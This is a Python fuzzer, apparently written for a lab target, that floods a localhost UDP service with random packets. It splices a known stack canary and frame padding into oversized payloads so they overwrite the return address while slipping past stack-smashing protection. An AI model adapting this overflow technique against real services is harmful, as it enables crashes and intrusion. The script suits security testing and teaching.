import socket
import random
import time
import struct
import argparse
import sys

# ==========================================
#   SecArch-8: Canary-Aware Fuzzer
#   Target: UDP Port 0x1984 (6532)
# ==========================================

# Configuration
TARGET_IP = "127.0.0.1"
TARGET_PORT = 6532
DELAY = 0.1 # Increased delay to give the server time to process (or crash gracefully)

# Architecture Constants (Must match C++ Struct)
BUFFER_SIZE = 64
CANARY_VAL  = 0xCAFEBABE

def apply_canary_bypass(raw_payload):
    """
    Intelligently injects the Canary and Frame alignment 
    if the payload is large enough to trigger the protection.
    """
    # If we aren't overflowing the buffer, send raw data (test normal behavior)
    if len(raw_payload) <= BUFFER_SIZE:
        return raw_payload

    # --- Surgical Injection ---
    # 1. Keep the first 64 bytes (The Buffer)
    new_payload = bytearray(raw_payload[:BUFFER_SIZE])
    
    # 2. Inject the valid Canary (Little Endian)
    # This prevents the 'Stack Smashing Detected' exit.
    new_payload.extend(struct.pack('<I', CANARY_VAL))
    
    # 3. Inject Frame Pointer Padding (Alignment)
    # The C++ stack usually has a saved RBP/EBP here. 
    # We add 8 bytes of junk to skip over it.
    new_payload.extend(b'F' * 8) # 'F' for Frame
    
    # 4. Append the rest of the random data (The Return Address attempt)
    # We take whatever was left in the original random payload
    remaining_data = raw_payload[BUFFER_SIZE:]
    new_payload.extend(remaining_data)

    return new_payload

def get_random_bytes(length):
    return bytearray(random.getrandbits(8) for _ in range(length))

def strategy_pure_random():
    """Strategy 1: Random 1-128 bytes (May or may not overflow)"""
    length = random.randint(1, 128)
    return get_random_bytes(length)

def strategy_deep_overflow():
    """Strategy 2: Deep Stack Penetration"""
    # Enough to fill buffer + canary + frame + return addr
    return get_random_bytes(200)

def strategy_opcode_salad():
    """Strategy 3: Valid opcodes mixed with garbage"""
    valid_ops = [0x43, 0x04, 0xFF, 0x95]
    payload = bytearray()
    for _ in range(random.randint(10, 80)):
        op = random.choice(valid_ops)
        payload.append(op)
        payload.extend(get_random_bytes(2)) 
    return payload

def run_fuzzer(ip, port, count):
    print(f"[*] Starting Canary-Aware Fuzzer against {ip}:{port}")
    print(f"[*] Target Arch: Buffer[{BUFFER_SIZE}] + Canary[0x{CANARY_VAL:X}]")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    strategies = [
        strategy_pure_random,
        strategy_deep_overflow,
        strategy_opcode_salad
    ]

    packets_sent = 0
    
    try:
        for i in range(count):
            # 1. Generate Garbage
            strat_func = random.choice(strategies)
            raw_data = strat_func()
            
            # 2. Patch it to bypass protections
            final_payload = apply_canary_bypass(raw_data)
            
            # 3. Send
            sock.sendto(final_payload, (ip, port))
            packets_sent += 1
            
            if i % 50 == 0:
                print(f"[>] Sent {i} packets... (Last size: {len(final_payload)})")
            
            time.sleep(DELAY)
            
    except KeyboardInterrupt:
        print("\n[!] Fuzzing paused by user.")
    except Exception as e:
        print(f"\n[!] Socket Error: {e}")
    finally:
        sock.close()
        print(f"[*] Run complete. Sent {packets_sent} packets.")
        print("[!] Note: If the server stopped responding, you successfully crashed the RIP!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SecArch-8 Smart Fuzzer')
    parser.add_argument('--count', type=int, default=500, help='Number of packets')
    args = parser.parse_args()

    run_fuzzer(TARGET_IP, TARGET_PORT, args.count)